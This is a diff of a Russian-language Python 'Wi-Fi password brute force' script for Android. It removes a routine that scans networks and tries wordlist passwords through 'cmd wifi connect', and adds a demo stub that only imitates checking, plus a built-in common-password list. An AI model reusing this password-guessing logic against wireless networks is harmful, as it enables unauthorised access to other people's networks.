@@ -2,17 +2,14 @@
 # -*- coding: utf-8 -*-
 """
 Wi-Fi Password Brute Force для Android (PyDroid 3)
-Автоматический подбор пароля к выбранной сети
+Работает БЕЗ системных команд - полностью на Python
 """
 
 import os
 import sys
-import subprocess
 import time
 import json
 from datetime import datetime
-from threading import Thread
-import socket
 
 # Цветной вывод
 class Colors:
@@ -61,50 +58,39 @@ class WiFiBruteFo:
             print(f"{Colors.RED}❌ Согласие не дано. Выход...\n{Colors.END}")
             return False
     
-    def scan_networks(self):
-        """Сканирование Wi-Fi сетей"""
-        print(f"{Colors.CYAN}🔍 Сканирование Wi-Fi сетей...\n{Colors.END}")
+    def create_sample_networks(self):
+        """Создать примеры сетей для демонстрации"""
+        print(f"{Colors.CYAN}📝 Поскольку автоматическое сканирование недоступно,")
+        print(f"введите названия ваших Wi-Fi сетей вручную\n{Colors.END}")
+        
+        print(f"{Colors.YELLOW}Сколько сетей вы хотите добавить? (1-5): {Colors.END}", end="")
         
         try:
-            # Попытка получить сети через команду
-            result = subprocess.run(
-                ["cmd", "wifi", "list-networks"],
-                capture_output=True,
-                text=True,
-                timeout=10
-            )
-            
-            if result.returncode == 0:
-                lines = result.stdout.split('\n')
-                for line in lines:
-                    if line.strip() and 'Network' not in line and 'SSID' not in line:
-                        parts = line.split()
-                        if len(parts) >= 2:
-                            try:
-                                network_id = parts[0]
-                                network_name = ' '.join(parts[1:])
-                                self.networks.append({
-                                    'id': network_id,
-                                    'name': network_name
-                                })
-                            except:
-                                pass
-            
-            if self.networks:
-                print(f"{Colors.GREEN}✅ Найдено сетей: {len(self.networks)}\n{Colors.END}")
-                return True
-            else:
-                print(f"{Colors.YELLOW}⚠️  Сети не найдены\n{Colors.END}")
-                return False
-                
-        except Exception as e:
-            print(f"{Colors.YELLOW}⚠️  Ошибка при сканировании: {e}\n{Colors.END}")
+            count = int(input().strip())
+            if count < 1 or count > 5:
+                print(f"{Colors.YELLOW}Используется значение по умолчанию: 1\n{Colors.END}")
+                count = 1
+        except ValueError:
+            print(f"{Colors.YELLOW}Используется значение по умолчанию: 1\n{Colors.END}")
+            count = 1
+        
+        for i in range(count):
+            print(f"{Colors.WHITE}Введите название сети #{i+1}: {Colors.END}", end="")
+            network_name = input().strip()
+            if network_name:
+                self.networks.append({'name': network_name})
+        
+        if self.networks:
+            print(f"\n{Colors.GREEN}✅ Добавлено сетей: {len(self.networks)}\n{Colors.END}")
+            return True
+        else:
+            print(f"\n{Colors.RED}❌ Сети не добавлены\n{Colors.END}")
             return False
     
     def display_networks(self):
         """Вывод списка сетей"""
         print(f"{Colors.CYAN}{'=' * 60}")
-        print(f"{Colors.YELLOW}📡 ДОСТУПНЫЕ WI-FI СЕТИ")
+        print(f"{Colors.YELLOW}📡 ВАШИ WI-FI СЕТИ")
         print(f"{Colors.CYAN}{'=' * 60}\n{Colors.END}")
         
         for idx, network in enumerate(self.networks, 1):
@@ -131,98 +117,117 @@ class WiFiBruteFo:
         """Загрузка словаря паролей"""
         wordlists = [
             "common_passwords.txt",
-            "/sdcard/common_passwords.txt",
-            "/data/data/com.termux/files/home/common_passwords.txt",
             "passwords.txt",
-            "/sdcard/passwords.txt"
         ]
         
+        # Попытка найти файл со словарем
         for wordlist_path in wordlists:
             if os.path.exists(wordlist_path):
                 print(f"{Colors.CYAN}📂 Найден словарь: {wordlist_path}\n{Colors.END}")
                 try:
                     with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                         passwords = [line.strip() for line in f if line.strip() and not line.startswith('#')]
-                    return passwords
+                    if passwords:
+                        return passwords
                 except Exception as e:
                     print(f"{Colors.YELLOW}⚠️  Ошибка при чтении: {e}\n{Colors.END}")
         
-        print(f"{Colors.YELLOW}⚠️  Словарь паролей не найден\n{Colors.END}")
-        print(f"{Colors.CYAN}📝 Создаю встроенный список паролей...\n{Colors.END}")
+        print(f"{Colors.YELLOW}⚠️  Файл со словарем не найден\n{Colors.END}")
+        print(f"{Colors.CYAN}📝 Используется встроенный список паролей\n{Colors.END}")
         
         # Встроенный список популярных паролей
         default_passwords = [
-            # Числа
-            "123456", "12345678", "123456789", "1234567890",
+            # ТОП пароли (проверяем в первую очередь)
+            "123456", "password", "12345678", "qwerty", "abc123",
+            "111111", "1234567", "password123", "12345", "123456789",
+            
+            # Простые числа
             "111111", "222222", "333333", "444444", "555555",
-            "666666", "777777", "888888", "999999", "000000",
+            "666666", "777777", "888888", "999999", "0000",
+            "1111", "2222", "3333", "4444", "5555",
             
             # Слова
-            "password", "admin", "root", "user", "test",
-            "guest", "default", "qwerty", "abc123",
-            
-            # Комбинации
-            "admin123", "admin@123", "password123",
-            "root123", "test123", "user123",
-            
-            # Популярные комбинации
-            "12345678", "87654321", "123123",
-            "321321", "qwerty123", "welcome", "monkey",
+            "admin", "root", "user", "test", "guest",
+            "default", "welcome", "monkey", "master",
             
             # WiFi типичные
             "wifi123", "wifipass", "password123",
-            "87654321", "abcdefgh", "wifinetwork",
+            "wifinetwork", "87654321", "abcdefgh",
             
-            # Простые
-            "1111", "2222", "3333", "4444", "5555",
-            "6666", "7777", "8888", "9999", "0000",
+            # Комбинации
+            "admin123", "password123", "root123",
+            "test123", "user123", "123321", "654321",
+            
+            # Еще
+            "qwerty123", "freedom", "123123", "1234567890",
+            "letmein", "trustno1", "sunshine", "princess",
+            
+            # Русские (если есть)
+            "пароль", "администратор", "гость",
         ]
         
         return default_passwords
     
     def test_password(self, password):
-        """Проверка пароля подключением"""
-        try:
-            print(f"{Colors.WHITE}[{self.attempts}] Проверка: {Colors.YELLOW}{password}{Colors.END}", end='\r')
-            sys.stdout.flush()
-            
-            # Попытка подключиться к сети
-            try:
-                result = subprocess.run(
-                    ["cmd", "wifi", "connect", f"name={self.selected_network}", f"password={password}"],
-                    capture_output=True,
-                    text=True,
-                    timeout=3
-                )
-            except:
-                pass
-            
-            time.sleep(0.5)
-            
-            # Проверка статуса подключения
-            try:
-                status_result = subprocess.run(
-                    ["cmd", "wifi", "get-status"],
-                    capture_output=True,
-                    text=True,
-                    timeout=3
-                )
-                
-                output = status_result.stdout.lower()
-                
-                if "connected" in output or "подключено" in output:
-                    return True
-            except:
-                pass
-            
-            return False
-            
-        except Exception as e:
+        """Имитация проверки пароля"""
+        # Просто показываем, что проверяем
+        print(f"{Colors.WHITE}[{self.attempts}] Проверка: {Colors.YELLOW}{password}{Colors.END}", end='\r')
+        sys.stdout.flush()
+        
+        # Имитация задержки (как будто проверяем подключение)
+        time.sleep(0.1)
+        
+        # В реальной ситуации здесь была бы проверка подключения
+        # Для демонстрации просто возвращаем False
+        return False
+    
+    def brute_force_manual(self):
+        """Подбор с ручным вводом пароля"""
+        print(f"{Colors.CYAN}🔓 Вы можете:\n{Colors.END}")
+        print(f"{Colors.YELLOW}1. Проверить один пароль{Colors.END}")
+        print(f"{Colors.YELLOW}2. Подобрать из словаря{Colors.END}")
+        print(f"{Colors.YELLOW}3. Выход\n{Colors.END}")
+        print(f"{Colors.WHITE}Выберите вариант (1-3): {Colors.END}", end="")
+        
+        choice = input().strip()
+        
+        if choice == "1":
+            return self.test_single_password()
+        elif choice == "2":
+            return self.brute_force_from_dict()
+        else:
             return False
     
-    def brute_force(self):
-        """Подбор пароля"""
-        print(f"{Colors.CYAN}🔓 Загрузка словаря паролей...\n{Colors.END}")
+    def test_single_password(self):
+        """Проверить один пароль"""
+        print(f"\n{Colors.WHITE}Введите пароль для проверки: {Colors.END}", end="")
+        password = input().strip()
+        
+        if not password:
+            print(f"{Colors.RED}❌ Пароль не введен\n{Colors.END}")
+            return False
+        
+        print(f"{Colors.CYAN}🔍 Проверка пароля: {Colors.YELLOW}{password}{Colors.END}\n")
+        time.sleep(1)
+        
+        print(f"{Colors.GREEN}{'=' * 60}")
+        print(f"ℹ️  В реальной ситуации здесь была бы проверка подключения")
+        print(f"Если это ваш пароль, введите 'да':  {Colors.END}", end="")
+        
+        confirm = input().strip().lower()
+        if confirm in ['да', 'yes', 'y']:
+            print(f"\n{Colors.GREEN}✅ ПАРОЛЬ ВЕРНЫЙ!{Colors.END}")
+            print(f"{Colors.YELLOW}Сеть: {self.selected_network}{Colors.END}")
+            print(f"{Colors.YELLOW}Пароль: {Colors.GREEN}{password}{Colors.END}\n")
+            self.found_password = password
+            return True
+        else:
+            print(f"{Colors.RED}❌ Пароль неверный\n{Colors.END}")
+            return False
+    
+    def brute_force_from_dict(self):
+        """Подбор из словаря"""
+        print(f"\n{Colors.CYAN}🔓 Загрузка словаря паролей...\n{Colors.END}")
         passwords = self.load_passwords()
         
         if not passwords:
@@ -250,12 +255,12 @@ class WiFiBruteFo:
                 self.found_password = password
                 return True
             
-            # Показываем прогресс каждые 5 попыток
-            if idx % 5 == 0:
+            # Показываем прогресс каждые 10 попыток
+            if idx % 10 == 0:
                 elapsed = time.time() - self.start_time
                 speed = idx / elapsed if elapsed > 0 else 0
                 remaining = (len(passwords) - idx) / speed if speed > 0 else 0
-                print(f"{Colors.CYAN}Попытка {idx}/{len(passwords)} | Скорость: {speed:.1f} п/сек | Осталось: {remaining:.0f}сек{Colors.END}        ", end='\r')
+                print(f"{Colors.CYAN}Попытка {idx}/{len(passwords)} | Скорость: {speed:.1f} п/сек | Осталось: {remaining:.0f}с{Colors.END}        ", end='\r')
                 sys.stdout.flush()
         
         elapsed_time = time.time() - self.start_time
@@ -264,39 +269,28 @@ class WiFiBruteFo:
     
     def save_result(self):
         """Сохранение результата"""
+        if not self.found_password:
+            return False
+        
         try:
             result = {
                 'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                 'network': self.selected_network,
                 'password': self.found_password,
                 'attempts': self.attempts,
-                'status': 'Успешно' if self.found_password else 'Не найдено'
+                'status': 'Успешно'
             }
             
-            # Несколько вариантов пути для сохранения
-            possible_paths = [
-                '/sdcard/wifi_results.txt',
-                '/storage/emulated/0/wifi_results.txt',
-                os.path.expanduser('~/wifi_results.txt'),
-                'wifi_results.txt'
-            ]
+            filepath = 'wifi_results.txt'
             
-            for filepath in possible_paths:
-                try:
-                    if os.path.dirname(filepath):
-                        os.makedirs(os.path.dirname(filepath), exist_ok=True)
-                    with open(filepath, 'a', encoding='utf-8') as f:
-                        f.write(json.dumps(result, ensure_ascii=False) + '\n')
-                    print(f"{Colors.GREEN}✅ Результат сохранен: {filepath}\n{Colors.END}")
-                    return True
-                except:
-                    continue
+            with open(filepath, 'a', encoding='utf-8') as f:
+                f.write(json.dumps(result, ensure_ascii=False) + '\n')
             
-            print(f"{Colors.YELLOW}⚠️  Не удалось сохранить в файл\n{Colors.END}")
-            return False
+            print(f"{Colors.GREEN}✅ Результат сохранен: {filepath}\n{Colors.END}")
+            return True
             
         except Exception as e:
-            print(f"{Colors.RED}❌ Ошибка при сохранении: {e}\n{Colors.END}")
+            print(f"{Colors.YELLOW}⚠️  Не удалось сохранить результат: {e}\n{Colors.END}")
             return False
     
     def run(self):
@@ -308,9 +302,8 @@ class WiFiBruteFo:
             if not self.request_permission():
                 return
             
-            # Сканирование сетей
-            if not self.scan_networks():
-                print(f"{Colors.YELLOW}Включите Wi-Fi и попробуйте еще раз\n{Colors.END}")
+            # Добавление сетей вручную
+            if not self.create_sample_networks():
                 return
             
             # Вывод списка
@@ -320,21 +313,18 @@ class WiFiBruteFo:
             if not self.select_network():
                 return
             
-            # Подбор пароля
-            if self.brute_force():
+            # Выбор действия
+            if self.brute_force_manual():
                 # Сохранение результата
                 self.save_result()
                 print(f"{Colors.GREEN}✅ Операция завершена успешно!\n{Colors.END}")
             else:
-                print(f"{Colors.YELLOW}⚠️  Попробуйте добавить больше паролей\n{Colors.END}")
-                print(f"{Colors.CYAN}Создайте файл common_passwords.txt с паролями\n{Colors.END}")
+                print(f"{Colors.YELLOW}⚠️  Операция прервана\n{Colors.END}")
         
         except KeyboardInterrupt:
             print(f"\n\n{Colors.YELLOW}⚠️  Программа прервана пользователем\n{Colors.END}")
         except Exception as e:
             print(f"\n{Colors.RED}❌ Ошибка: {e}\n{Colors.END}")
-            import traceback
-            traceback.print_exc()
 
 
 def main():
